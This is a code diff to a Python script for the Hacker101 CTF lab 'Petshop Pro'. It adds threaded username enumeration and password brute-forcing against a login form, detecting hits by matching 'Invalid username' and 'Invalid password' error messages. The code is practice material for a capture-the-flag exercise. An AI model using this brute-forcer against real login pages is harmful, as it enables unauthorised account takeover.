@@ -5,6 +5,7 @@ Hacker 101 CTF exercise "Petshop Pro" login cracker.
 from bruting import http as h
 from core.conf.http import HttpRequest
 from core.constants.http import Protocol, HttpMethod, ContentType, HeaderField
+from util.matching import http_resp_content_regex_flagger as f
 
 PROTOCOL = Protocol.HTTPS
 ENDPOINT = "login"
@@ -25,7 +26,25 @@ def crack_username(ip, instance_id):
     """
     path = "/".join((instance_id, ENDPOINT))
     req_template = HttpRequest(ip, method=HttpMethod.POST, path=path, headers=HEADERS)
-    h.parallel_attack(req_template, generate_uname_req, is_good_uname)
+    regex = r">Invalid username<"
+    return h.parallel_attack(req_template, generate_uname_req, f(regex, True), data_file="uname_list.txt", threads=20)
+
+
+def crack_password(ip, instance_id, username):
+    """
+    Enumerates common passwords and returns the valid ones after trying. A valid username is required.
+    :param ip:
+    :param instance_id:
+    :param username:
+    :return:
+    """
+    path = "/".join((instance_id, ENDPOINT))
+    req_template = HttpRequest(ip, method=HttpMethod.POST, path=path, headers=HEADERS)
+    regex = r">Invalid password<"
+    passwd_req_gen = get_passwd_func(username)
+    # Use the same common word list like username.
+    # A real password list is probably more suited for cracking a real application.
+    return h.parallel_attack(req_template, passwd_req_gen, f(regex, True), data_file="uname_list.txt", threads=20)
 
 
 def generate_uname_req(template, value):
@@ -35,5 +54,11 @@ def generate_uname_req(template, value):
     return target
 
 
-def is_good_uname(resp):
-    return True
+def get_passwd_func(username):
+    def generate_passwd_req(template, value):
+        target = template.clone()
+        body = {USERNAME_FIELD: str(username), PASSWORD_FIELD: str(value)}
+        target.body = body
+        return target
+
+    return generate_passwd_req
